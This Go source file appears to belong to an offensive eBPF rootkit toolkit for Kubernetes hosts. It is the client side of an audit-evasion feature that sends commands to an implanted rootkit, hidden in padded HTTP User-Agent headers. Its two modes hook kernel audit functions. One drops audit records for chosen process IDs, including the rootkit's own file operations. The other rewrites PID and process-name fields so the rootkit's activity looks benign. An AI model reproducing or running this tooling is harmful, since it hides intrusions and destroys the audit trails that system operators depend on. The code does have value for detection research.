package audit_filter

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type AuditFilterResult struct {
	Mode    string       `json:"mode"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, mode, filterPIDs, output string) error {
	var result *AuditFilterResult

	switch mode {
	case "suppress":
		result = suppressAudit(target, filterPIDs)
	case "modify":
		result = modifyAudit(target, filterPIDs)
	default:
		return fmt.Errorf("unsupported mode: %s (use suppress or modify)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func suppressAudit(target, filterPIDs string) *AuditFilterResult {
	result := &AuditFilterResult{Mode: "suppress"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_audit_log_start",
			"kprobe on audit_log_start to intercept audit record creation",
			"audit_hook_log_start",
		},
		{
			"configure_pid_filter",
			"populate BPF hash map with PIDs whose audit records should be dropped",
			"audit_set_pid_filter",
		},
		{
			"suppress_syscall_records",
			"prevent audit records from being generated for filtered process syscalls",
			"audit_suppress_syscall",
		},
		{
			"suppress_fs_records",
			"block filesystem access audit records for rootkit file operations",
			"audit_suppress_fs",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + filterPIDs
		status := sendAuditCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func modifyAudit(target, filterPIDs string) *AuditFilterResult {
	result := &AuditFilterResult{Mode: "modify"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_audit_log_end",
			"kprobe on audit_log_end to modify records before they're dispatched",
			"audit_hook_log_end",
		},
		{
			"rewrite_pid_field",
			"replace rootkit PID with innocent process PID in audit records",
			"audit_rewrite_pid",
		},
		{
			"sanitize_comm_field",
			"rewrite process comm field in audit records to benign names",
			"audit_sanitize_comm",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + filterPIDs
		status := sendAuditCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func sendAuditCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/audit_filter", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
